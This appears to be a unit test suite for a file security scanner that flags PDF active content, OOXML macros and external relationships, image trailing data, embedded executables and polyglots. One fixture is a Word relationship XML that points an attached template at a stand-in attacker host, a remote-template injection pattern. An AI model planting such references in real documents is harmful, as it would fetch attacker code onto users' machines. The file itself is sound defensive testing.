/**
 * @sug/test/unit/security-engine/format-checks
 * Unit test suite for P17 format security checkers:
 * - PDF Active Content
 * - OOXML Macro and External Relationships
 * - Image Trailing Data
 * - Embedded Executable Signatures
 * - Basic Polyglots
 */

import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import {
  inspectPdf,
  inspectOoxml,
  inspectImageTrailing,
  inspectEmbeddedSignatures,
  inspectPolyglot,
} from '@sug/security-engine';
import {
  createCleanPdfBuffer,
  createActiveContentPdfBuffer,
  createCleanPngBuffer,
  createTrailingPngBuffer,
  createCleanJpegBuffer,
  createTrailingJpegBuffer,
  createCleanGifBuffer,
  createTrailingGifBuffer,
  createEmbeddedPeBuffer,
  createEmbeddedElfBuffer,
  createEmbeddedMachoBuffer,
  createMinimalZipBuffer,
  createGifZipPolyglotBuffer,
  createJpegZipPolyglotBuffer,
  createPdfZipPolyglotBuffer,
  createAdvancedPolyglotBuffer,
} from '../../fixtures/format-fixtures.js';

describe('P17 Format Checks Unit Suite', () => {
  describe('PDF Active Content Check (scan-04)', () => {
    it('returns PASS and CLEAN for benign PDF without active content', async () => {
      const cleanPdf = createCleanPdfBuffer();
      const result = await inspectPdf({ buffer: cleanPdf });

      expect(result.checkId).toBe('scanner.pdf');
      expect(result.outcome).toBe('PASS');
      expect(result.reasonCode).toBe('CLEAN');
      expect(result.severity).toBe('INFO');
      expect(result.detectedKeywords).toHaveLength(0);
    });

    it('detects uncompressed /JavaScript active content keyword', async () => {
      const jsPdf = createActiveContentPdfBuffer('javascript');
      const result = await inspectPdf({ buffer: jsPdf });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('ACTIVE_CONTENT_DETECTED');
      expect(result.severity).toBe('HIGH');
      expect(result.detectedKeywords).toContain('/JavaScript');
    });

    it('detects /Launch executable action keyword', async () => {
      const launchPdf = createActiveContentPdfBuffer('launch');
      const result = await inspectPdf({ buffer: launchPdf });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('ACTIVE_CONTENT_DETECTED');
      expect(result.detectedKeywords).toContain('/Launch');
    });

    it('detects hex-encoded active content name (/#4a#61#76#61#53#63#72#69#70#74)', async () => {
      const hexJsPdf = createActiveContentPdfBuffer('hex_js');
      const result = await inspectPdf({ buffer: hexJsPdf });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('ACTIVE_CONTENT_DETECTED');
      expect(result.detectedKeywords).toContain('/JavaScript');
    });

    it('detects active content embedded inside FlateDecode compressed stream', async () => {
      const flateJsPdf = createActiveContentPdfBuffer('flate_js');
      const result = await inspectPdf({ buffer: flateJsPdf });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('ACTIVE_CONTENT_DETECTED');
      expect(result.detectedKeywords).toContain('/JavaScript');
    });

    it('returns ERROR and PDF_MALFORMED for non-PDF input', async () => {
      const garbage = Buffer.from('NOT A PDF FILE AT ALL');
      const result = await inspectPdf({ buffer: garbage });

      expect(result.outcome).toBe('ERROR');
      expect(result.reasonCode).toBe('PDF_MALFORMED');
    });

    it('returns ERROR and PDF_MALFORMED for truncated PDF missing %%EOF', async () => {
      const truncated = Buffer.from('%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n');
      const result = await inspectPdf({ buffer: truncated });

      expect(result.outcome).toBe('ERROR');
      expect(result.reasonCode).toBe('PDF_MALFORMED');
      expect(result.evidence.error).toContain('Missing %%EOF');
    });

    it('runs through production qpdf normalization path for clean PDF', async () => {
      const cleanPdf = createCleanPdfBuffer();
      const mockScript = path.resolve(process.cwd(), 'tests/fixtures/qpdf-mock.mjs');

      const originalMode = process.env.MOCK_QPDF_MODE;
      process.env.MOCK_QPDF_MODE = 'success';
      try {
        const result = await inspectPdf({
          buffer: cleanPdf,
          qpdfPath: process.execPath,
          qpdfArgs: [mockScript],
        });

        expect(result.outcome).toBe('PASS');
        expect(result.reasonCode).toBe('CLEAN');
        expect(result.engine).toBe('qpdf');
        expect(result.evidence.normalizedWithQpdf).toBe(true);
      } finally {
        process.env.MOCK_QPDF_MODE = originalMode;
      }
    });

    it('runs through production qpdf normalization path for active-content PDF', async () => {
      const activePdf = createActiveContentPdfBuffer('javascript');
      const mockScript = path.resolve(process.cwd(), 'tests/fixtures/qpdf-mock.mjs');

      const originalMode = process.env.MOCK_QPDF_MODE;
      process.env.MOCK_QPDF_MODE = 'success';
      try {
        const result = await inspectPdf({
          buffer: activePdf,
          qpdfPath: process.execPath,
          qpdfArgs: [mockScript],
        });

        expect(result.outcome).toBe('FAIL');
        expect(result.reasonCode).toBe('ACTIVE_CONTENT_DETECTED');
        expect(result.engine).toBe('qpdf');
        expect(result.detectedKeywords).toContain('/JavaScript');
      } finally {
        process.env.MOCK_QPDF_MODE = originalMode;
      }
    });

    it('fails closed (ERROR / PDF_MALFORMED) when qpdf rejects malformed PDF', async () => {
      const cleanPdf = createCleanPdfBuffer();
      const mockScript = path.resolve(process.cwd(), 'tests/fixtures/qpdf-mock.mjs');

      const originalMode = process.env.MOCK_QPDF_MODE;
      process.env.MOCK_QPDF_MODE = 'malformed';
      try {
        const result = await inspectPdf({
          buffer: cleanPdf,
          qpdfPath: process.execPath,
          qpdfArgs: [mockScript],
        });

        expect(result.outcome).toBe('ERROR');
        expect(result.reasonCode).toBe('PDF_MALFORMED');
        expect(result.engine).toBe('qpdf');
        expect(result.outcome).not.toBe('PASS');
      } finally {
        process.env.MOCK_QPDF_MODE = originalMode;
      }
    });

    it('fails closed (ERROR / PDF_NORMALIZATION_FAILED) when qpdf normalization times out', async () => {
      const cleanPdf = createCleanPdfBuffer();
      const mockScript = path.resolve(process.cwd(), 'tests/fixtures/qpdf-mock.mjs');

      const originalMode = process.env.MOCK_QPDF_MODE;
      process.env.MOCK_QPDF_MODE = 'timeout';
      try {
        const result = await inspectPdf({
          buffer: cleanPdf,
          qpdfPath: process.execPath,
          qpdfArgs: [mockScript],
          timeoutMs: 300,
        });

        expect(result.outcome).toBe('ERROR');
        expect(result.reasonCode).toBe('PDF_NORMALIZATION_FAILED');
        expect(result.evidence.timedOut).toBe(true);
        expect(result.outcome).not.toBe('PASS');
      } finally {
        process.env.MOCK_QPDF_MODE = originalMode;
      }
    });

    it('fails closed (ERROR / PDF_NORMALIZATION_FAILED) when qpdf process crashes or errors', async () => {
      const cleanPdf = createCleanPdfBuffer();
      const mockScript = path.resolve(process.cwd(), 'tests/fixtures/qpdf-mock.mjs');

      const originalMode = process.env.MOCK_QPDF_MODE;
      process.env.MOCK_QPDF_MODE = 'error';
      try {
        const result = await inspectPdf({
          buffer: cleanPdf,
          qpdfPath: process.execPath,
          qpdfArgs: [mockScript],
        });

        expect(result.outcome).toBe('ERROR');
        expect(result.reasonCode).toBe('PDF_NORMALIZATION_FAILED');
        expect(result.outcome).not.toBe('PASS');
      } finally {
        process.env.MOCK_QPDF_MODE = originalMode;
      }
    });
  });

  describe('OOXML Macro & Relationship Checks (scan-05 & scan-06)', () => {
    it('returns PASS/CLEAN for benign OOXML container with internal relationships', async () => {
      const tmpDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ooxml-test-'));
      const docxPath = path.join(tmpDir, 'clean.docx');

      // Create ZIP with clean [Content_Types].xml and document.xml
      const zipBuf = createMinimalZipBuffer(
        'word/document.xml',
        '<w:document><w:body><w:p><w:r><w:t>Hello World</w:t></w:r></w:p></w:body></w:document>',
      );
      await fs.promises.writeFile(docxPath, zipBuf);

      const result = await inspectOoxml({ filePath: docxPath });
      await fs.promises.rm(tmpDir, { recursive: true, force: true });

      expect(result.macro.outcome).toBe('PASS');
      expect(result.macro.reasonCode).toBe('CLEAN');
      expect(result.relationships.outcome).toBe('PASS');
      expect(result.relationships.reasonCode).toBe('CLEAN');
    });

    it('scan-05: detects macro project entry (vbaProject.bin)', async () => {
      const tmpDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ooxml-macro-'));
      const docmPath = path.join(tmpDir, 'test.docm');

      const zipBuf = createMinimalZipBuffer(
        'word/vbaProject.bin',
        'DUMMY_VBA_PROJECT_BINARY_STREAM',
      );
      await fs.promises.writeFile(docmPath, zipBuf);

      const result = await inspectOoxml({ filePath: docmPath });
      await fs.promises.rm(tmpDir, { recursive: true, force: true });

      expect(result.macro.outcome).toBe('FAIL');
      expect(result.macro.reasonCode).toBe('OOXML_MACRO_DETECTED');
      expect(result.macro.macroEntries).toContain('word/vbaProject.bin');
    });

    it('scan-06: detects external relationships with zero network activity', async () => {
      const tmpDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ooxml-rels-'));
      const docxPath = path.join(tmpDir, 'external.docx');

      const relsXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://attacker.example.com/template.dotm" TargetMode="External"/>
</Relationships>`;

      const zipBuf = createMinimalZipBuffer('word/_rels/document.xml.rels', relsXml);
      await fs.promises.writeFile(docxPath, zipBuf);

      const result = await inspectOoxml({ filePath: docxPath });
      await fs.promises.rm(tmpDir, { recursive: true, force: true });

      expect(result.relationships.outcome).toBe('FAIL');
      expect(result.relationships.reasonCode).toBe('OOXML_EXTERNAL_RELATIONSHIP');
      expect(result.relationships.externalTargets).toHaveLength(1);
      expect(result.relationships.externalTargets[0]!.target).toBe(
        'http://attacker.example.com/template.dotm',
      );
    });
  });

  describe('Image Trailing Data Check', () => {
    it('returns PASS/CLEAN for standard legal PNG', async () => {
      const png = createCleanPngBuffer();
      const result = await inspectImageTrailing({ buffer: png });

      expect(result.outcome).toBe('PASS');
      expect(result.reasonCode).toBe('CLEAN');
      expect(result.format).toBe('png');
      expect(result.trailingBytesCount).toBe(0);
    });

    it('detects trailing payload appended after PNG IEND chunk', async () => {
      const pngWithTrailing = createTrailingPngBuffer();
      const result = await inspectImageTrailing({ buffer: pngWithTrailing });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('IMAGE_TRAILING_DATA_DETECTED');
      expect(result.format).toBe('png');
      expect(result.trailingBytesCount).toBeGreaterThan(0);
    });

    it('returns PASS/CLEAN for legal JPEG', async () => {
      const jpeg = createCleanJpegBuffer();
      const result = await inspectImageTrailing({ buffer: jpeg });

      expect(result.outcome).toBe('PASS');
      expect(result.reasonCode).toBe('CLEAN');
      expect(result.format).toBe('jpeg');
      expect(result.trailingBytesCount).toBe(0);
    });

    it('detects trailing payload appended after JPEG EOI marker', async () => {
      const jpegWithTrailing = createTrailingJpegBuffer();
      const result = await inspectImageTrailing({ buffer: jpegWithTrailing });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('IMAGE_TRAILING_DATA_DETECTED');
      expect(result.format).toBe('jpeg');
      expect(result.trailingBytesCount).toBeGreaterThan(0);
    });

    it('returns PASS/CLEAN for legal GIF', async () => {
      const gif = createCleanGifBuffer();
      const result = await inspectImageTrailing({ buffer: gif });

      expect(result.outcome).toBe('PASS');
      expect(result.reasonCode).toBe('CLEAN');
      expect(result.format).toBe('gif');
      expect(result.trailingBytesCount).toBe(0);
    });

    it('detects trailing data appended after GIF trailer', async () => {
      const gifWithTrailing = createTrailingGifBuffer();
      const result = await inspectImageTrailing({ buffer: gifWithTrailing });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('IMAGE_TRAILING_DATA_DETECTED');
      expect(result.format).toBe('gif');
      expect(result.trailingBytesCount).toBeGreaterThan(0);
    });
  });

  describe('Embedded Executable Signature Check', () => {
    it('returns PASS/CLEAN for clean buffer without executable headers', async () => {
      const buffer = Buffer.from('Plain text file with no executable headers');
      const result = await inspectEmbeddedSignatures({ buffer });

      expect(result.outcome).toBe('PASS');
      expect(result.reasonCode).toBe('CLEAN');
      expect(result.matches).toHaveLength(0);
    });

    it('detects embedded PE/MZ header at non-zero offset', async () => {
      const buffer = createEmbeddedPeBuffer(256);
      const result = await inspectEmbeddedSignatures({ buffer });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('EMBEDDED_EXECUTABLE_DETECTED');
      expect(result.severity).toBe('CRITICAL');
      expect(result.matches.some((m) => m.signatureType === 'PE')).toBe(true);
    });

    it('detects embedded ELF header at non-zero offset', async () => {
      const buffer = createEmbeddedElfBuffer(128);
      const result = await inspectEmbeddedSignatures({ buffer });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('EMBEDDED_EXECUTABLE_DETECTED');
      expect(result.severity).toBe('CRITICAL');
      expect(result.matches.some((m) => m.signatureType === 'ELF')).toBe(true);
    });

    it('detects embedded Mach-O header at non-zero offset', async () => {
      const buffer = createEmbeddedMachoBuffer(64);
      const result = await inspectEmbeddedSignatures({ buffer });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('EMBEDDED_EXECUTABLE_DETECTED');
      expect(result.severity).toBe('CRITICAL');
      expect(result.matches.some((m) => m.signatureType === 'MACHO')).toBe(true);
    });
  });

  describe('Polyglot Detection Matrix', () => {
    it('poly-01: detects GIF-ZIP polyglot', async () => {
      const poly = createGifZipPolyglotBuffer();
      const result = await inspectPolyglot({ buffer: poly });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('POLYGLOT_DETECTED');
      expect(result.primaryFormat).toBe('GIF');
      expect(result.secondaryFormat).toBe('ZIP');
    });

    it('poly-02: detects JPEG-ZIP polyglot', async () => {
      const poly = createJpegZipPolyglotBuffer();
      const result = await inspectPolyglot({ buffer: poly });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('POLYGLOT_DETECTED');
      expect(result.primaryFormat).toBe('JPEG');
      expect(result.secondaryFormat).toBe('ZIP');
    });

    it('poly-03: detects PDF-ZIP polyglot', async () => {
      const poly = createPdfZipPolyglotBuffer();
      const result = await inspectPolyglot({ buffer: poly });

      expect(result.outcome).toBe('FAIL');
      expect(result.reasonCode).toBe('POLYGLOT_DETECTED');
      expect(result.primaryFormat).toBe('PDF');
      expect(result.secondaryFormat).toBe('ZIP');
    });

    it('poly-04: documented miss for advanced parasitic container', async () => {
      const poly = createAdvancedPolyglotBuffer();
      const result = await inspectPolyglot({ buffer: poly });

      // Documented miss: Returns CLEAN because advanced polyglot lacks standard ZIP EOCD
      expect(result.outcome).toBe('PASS');
      expect(result.reasonCode).toBe('CLEAN');
    });
  });
});
